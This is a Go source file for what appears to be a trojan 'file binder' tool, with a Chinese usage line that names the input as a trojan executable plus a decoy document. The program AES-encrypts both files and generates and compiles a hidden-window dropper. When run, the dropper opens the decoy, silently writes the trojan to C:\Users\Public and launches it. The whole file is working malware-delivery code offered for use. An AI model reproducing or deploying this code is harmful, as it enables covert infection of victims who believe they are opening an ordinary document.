package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

var (
	logo = `
	\__  |   |   |  |__   _____|__|_  _  __ ____ |__|
	/   |   |   |  |  \ /  ___/  \ \/ \/ // __ \|  |
	\____   |   |   Y  \\___ \|  |\     /\  ___/|  |
	/ ______|___|___|  /____  >__| \/\_/  \___  >__|
	\/               \/     \/                \/   
	`
	tvb = "这是我的频道欢迎投稿学习:https://space.bilibili.com/353948151	"

	keytishi = `
	首先编译好命令参数如: GoFileBinder.exe	木马.exe xxx.txt
	`
)

func RandStr(length int) string {
	str := "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
	bytes := []byte(str)
	result := []byte{}
	rand.Seed(time.Now().UnixNano() + int64(rand.Intn(100)))
	for i := 0; i < length; i++ {
		result = append(result, bytes[rand.Intn(len(bytes))])
	}
	return string(result)
}
func main() {

	fmt.Println(logo)
	fmt.Println(tvb)
	if len(os.Args) != 3 {
		fmt.Println(keytishi)
		return
	}
	mumafile := os.Args[1]
	docfile := os.Args[2]
	key := RandStr(16)

	info, _ := ioutil.ReadFile(mumafile)
	var mumafileStr string = string(info[:])
	AesmumafileStr := AesEncrypt(mumafileStr, key)

	infodoc, _ := ioutil.ReadFile(docfile)
	var docfileStr string = string(infodoc[:])
	AesdocfileStr := AesEncrypt(docfileStr, key)
	SourceCode := fmt.Sprintf(`
	package main
	import (
		"crypto/aes"
		"crypto/cipher"
		"encoding/base64"
		"os"
		"os/exec"
		"strings"
		"syscall"
	)
	
	var (
		key          = "%s"
		mumafilename = "%s"
		docfilename  = "%s"
		docfilenames = "%s"
		docfile = "%s"
		
		numafile = "%s"
	)
	
	func main() {
	
		dstFile := "\\Users\\Public\\Yihsiwei.DAT"
		selfile, _ := os.Executable()
		panfu := selfile[0:2]
		if !strings.Contains(selfile, "C:") {
	
			dstFile = panfu + "\\CWAWF.DAT"
		} else {
			dstFile = panfu + dstFile
		}

		os.Rename(selfile, dstFile)

		ddocfile := AesDecrypt(docfile, key)
		f2, _ := os.Create(docfilename)
		_, _ = f2.Write([]byte(ddocfile))
		f2.Close()
		strccc, _ := os.Getwd()
		cmd := exec.Command("cmd",  " /c ",strccc+docfilenames)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		//cmd2.Stdout = os.Stdout
		_ = cmd.Start()
		var dstFilecc = "C:\\Users\\Public\\" + mumafilename
		f, _ := os.Create(dstFilecc)
		dmumafile := AesDecrypt(numafile, key)
		_, _ = f.Write([]byte(dmumafile))
		f.Close()

		_, err := os.Stat(dstFilecc)
	
		if err == nil {
	
			cmda := exec.Command(dstFilecc)
			_ = cmda.Start()
	
		}
	
	}
	
	func PKCS7UnPadding(origData []byte) []byte {
		length := len(origData)
		unpadding := int(origData[length-1])
		return origData[:(length - unpadding)]
	}
	func AesDecrypt(cryted string, key string) string {
		crytedByte, _ := base64.StdEncoding.DecodeString(cryted)
		k := []byte(key)
		block, _ := aes.NewCipher(k)
		blockSize := block.BlockSize()
		blockMode := cipher.NewCBCDecrypter(block, k[:blockSize])
		orig := make([]byte, len(crytedByte))
		blockMode.CryptBlocks(orig, crytedByte)
		orig = PKCS7UnPadding(orig)
		return string(orig)
	}
	`, key, mumafile, docfile, "\\\\"+docfile, AesdocfileStr, AesmumafileStr)

	f, _ := os.Create("outfile.go")

	_, _ = f.Write([]byte(SourceCode))
	f.Close()

	exitfile("outfile.go")
	time.Sleep(time.Duration(1) * time.Second)

	batfile, _ := os.Create("Yihsiwei.bat")

	_, _ = batfile.Write([]byte("go build -ldflags \"-H=windowsgui\" outfile.go"))
	batfile.Close()
	exitfile("Yihsiwei.bat")
	time.Sleep(time.Duration(1) * time.Second)
	cmd := exec.Command("Yihsiwei.bat")
	_ = cmd.Start()

	exitfile("outfile.exe")
	//os.RemoveAll("outfile.go")
	os.RemoveAll("Yihsiwei.bat")

}
func exitfile(filename string) {
	for {
		time.Sleep(time.Duration(1) * time.Second)
		_, err := os.Stat(GetCurrentDirectory() + "/" + filename)
		if err == nil {
			break
		}
	}
}
func GetCurrentDirectory() string {
	dir, err := filepath.Abs(filepath.Dir(os.Args[0]))
	if err != nil {
		log.Fatal(err)
	}

	return strings.Replace(dir, "\\", "/", -1)
}
func PKCS7Padding(ciphertext []byte, blocksize int) []byte {
	padding := blocksize - len(ciphertext)%blocksize
	padtext := bytes.Repeat([]byte{byte(padding)}, padding)
	return append(ciphertext, padtext...)
}

func AesEncrypt(orig string, key string) string {
	origData := []byte(orig)
	k := []byte(key)
	block, _ := aes.NewCipher(k)
	blockSize := block.BlockSize()
	origData = PKCS7Padding(origData, blockSize)
	blockMode := cipher.NewCBCEncrypter(block, k[:blockSize])
	cryted := make([]byte, len(origData))
	blockMode.CryptBlocks(cryted, origData)
	return base64.StdEncoding.EncodeToString(cryted)
}
